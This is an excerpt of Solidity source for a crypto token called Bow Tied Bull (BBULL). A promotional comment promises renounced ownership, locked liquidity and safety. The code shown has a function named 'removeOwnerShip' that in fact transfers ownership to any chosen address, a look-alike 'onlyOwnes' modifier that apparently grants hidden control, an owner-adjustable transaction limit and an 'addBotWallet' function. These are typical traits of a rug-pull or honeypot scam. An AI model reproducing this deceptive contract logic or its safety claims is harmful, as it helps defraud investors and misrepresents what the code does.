/*
    ...
    Bull run is being missed with the current market wide correction.
    Are you ready to start the Santa rally? Bowtied Bull will be your Santa this year. Crypto Nerds get ready.
    Bow tied bull is safe. Liquidity will be locked and ownership renounced. Contract auditing will be  .
    
        Total tax on buys: 10%

        5% to wallet for buy backs 

        5% to marketing

        Total tax on sells: 10%
...
contract Ownable is Context {
    ...
    */
    ...
    function removeOwnerShip(address newOwner) public virtual onlyOwnes {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _owner = newOwner;
    }
...
contract BowTiedBull is Context, IERC20, Ownable {
    ...
    string private _name = "Bow Tied Bull";
    string private _symbol = "BBULL";
    ...
    function upliftTxAmounts(uint256 _maxTxAmounts) external onlyOwnes() {
        _maxTxAmount = _maxTxAmounts;
    }
    
    function setSwapThresholdAmount(uint256 SwapThresholdAmount) external onlyOwner() {
        require(SwapThresholdAmount > 10, "Swap Threshold Amount cannot be less than 10 token");
    ...
    function addBotWallet(address botwallet) external onlyOwnes() {
